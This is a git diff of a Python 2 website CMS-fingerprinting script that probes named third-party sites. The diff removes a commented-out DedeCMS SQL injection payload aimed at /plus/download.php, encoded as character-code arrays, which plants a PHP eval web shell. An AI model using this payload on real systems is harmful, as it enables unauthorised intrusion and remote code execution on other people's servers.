@@ -2,6 +2,7 @@
 
 from PluginManager import PluginManager
 from PluginManager import Model_CMS
+from PluginManager import Model_Header
 from Crawler import Crawler
 import pytesseract
 from PIL import Image
@@ -10,8 +11,10 @@ from lxml import etree
 import requests
 
 # load plugins
+
 PluginManager.LoadAllPlugin()
 plugins = Model_CMS.GetPluginObject()
+header_plugins = Model_Header.GetPluginObject()
 
 '''
 url test, 主要验证下别人的指纹哪些能够访问到，作为自己识别指纹的参考
@@ -35,24 +38,28 @@ def url_test():
 '''
 
 
-def single_test():
-    # target = "http://www.wellidc.net" #phpcms
-    # target = "http://www.joomlachina.cn"  # joomla
-    target = "http://www.dstex.cn/" #ecshop
-    # target = "http://bbs.heilanhome.com/" #discuz
-    # target = "https://zhidao.baidu.com/"#
-
+def single_test(target):
     index_content = ""
+    index_header = ""
     try:
-        index_content = requests.get(target).content
+        r = requests.get(target)
+        index_content = r.content
+        index_header = r.headers
+        print target + ":"
     except:
         print "[HTTPConnectionError] " + target
         exit(0)
 
+    for head_plugin in header_plugins:
+        print "server:", head_plugin.get(index_header)
     for plugin in plugins:
-        detect_res = plugin.detect(target, index_content)
+        try:
+            detect_res = plugin.detect(target, index_content)
+        except:
+            print "read error"
+            continue
         if detect_res:
-            print(target + "\ncms : " + plugin.name + "\nversion: " + plugin.version(target, index_content))
+            print("cms : " + plugin.name + " / " + plugin.version(target, index_content))
 
 
 '''
@@ -89,7 +96,7 @@ def ip2domain(ip):
     s = requests.get("https://dns.aizhan.com/%s/"%ip)
     dom = etree.HTML(s.content)
     temp = dom.xpath("//td[@class='domain']/a")
-    if len(temp)>0:
+    if len(temp) > 0:
         print(ip, ":", temp[0].text)
     else:
         print(ip, ":", "no result")
@@ -98,38 +105,13 @@ def ip2domain(ip):
 
 if __name__ == '__main__':
     # url_test()
-    single_test()
+
+    # target = "http://www.wellidc.net" #phpcms
+    # target = "http://scs.ucas.ac.cn/"  # joomla
+    target = "http://www.dedecms.com/" # dedecms
+    # target = "http://www.dstex.cn/" #ecshop
+    # target = "http://bbs.heilanhome.com/" #discuz
+    # target = "https://zhidao.baidu.com/"#
+    single_test(target)
+
     #crawler_multi_test()
-    # Crawler.zoomeye_search("test")
-    # testocr()
-
-    # s0 = "99 102 103 95 100 98 112 114 101 102 105 120"
-    # s = "109 121 97 100 96 32 83 69 84 32 96 110 111 114 109 98 111 100 121 96 32 61 32 39 60 63 112 104 112 32 102 105 108 101 95 112 117 116 95 99 111 110 116 101 110 116 115 40 39 39 109 111 111 110 46 112 104 112 39 39 44 39 39 60 63 112 104 112 32 101 118 97 108 40 36 95 80 79 83 84 91 120 93 41 59 101 99 104 111 32 109 79 111 110 59 63 62 39 39 41 59 63 62 39 32 87 72 69 82 69 32 96 97 105 100 96 32 61 49 57 32 35"
-    # s = s.split(" ")
-    # str = ""
-    # for c in s:
-    #     # print c
-    #     str += chr(int(c))
-    #     # print chr(int(c))
-    # print "[" + str + "]"
-
-    # str_arrs2_prefix = "&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39"
-    # str_arrs2_filename = "xxx.php"
-    # str_arrs2_middle = "&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39"
-    # str_arrs2_filecontent = "<?php eval($_POST[x]);echo mOon;?>'');?>"
-    # str_arrs2_inject = "' WHERE aid ="
-    # str_arrs2_aid = "19"
-    # str_arrs2_end = "&arrs2[]=32&arrs2[]=35"
-
-    # str_arrs1 = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120"
-    # str_arrs2_origin = "myad` SET `normbody` = '<?php file_put_contents(''moon.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE `aid` =19 #"
-    #
-    # str_arrs2_trans = ""
-    # for c in str_arrs2_origin:
-    #     current = "&arrs2[]=" + str(ord(c))
-    #     str_arrs2_trans += current
-    # print str_arrs1 + str_arrs2_trans
-
-    # ip = IPy.IP('123.56.0.0/16')
-    # for x in ip:
-    #     ip2domain(x.__str__())
